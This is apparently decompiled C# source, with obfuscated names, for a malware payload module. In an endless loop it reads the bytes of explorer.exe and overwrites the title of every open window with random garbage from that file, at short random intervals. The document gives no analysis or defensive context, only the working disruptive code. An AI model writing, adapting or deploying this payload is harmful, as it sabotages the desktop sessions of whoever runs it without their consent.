using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200002D RID: 45
public class GClass12
{
	// Token: 0x060000C6 RID: 198 RVA: 0x000060AC File Offset: 0x000042AC
	public void method_0()
	{
		char[] array = File.ReadAllText("C:\\Windows\\explorer.exe").ToCharArray();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		for (;;)
		{
			Random random = new Random();
			string text = "";
			IntPtr intPtr = GClass2.GetTopWindow(GClass2.GetDesktopWindow());
			intPtr = GClass2.GetWindow(intPtr, GClass2.GEnum2.GW_HWNDLAST);
			for (int i = 0; i < random.Next(500, array.Length); i++)
			{
				text += array[random.Next(array.Length)].ToString();
			}
			do
			{
				GClass2.SetWindowText(intPtr, text);
			}
			while ((intPtr = GClass2.GetWindow(intPtr, GClass2.GEnum2.GW_HWNDPREV)) != IntPtr.Zero);
			Thread.Sleep(random.Next(100, 500));
		}
	}
}
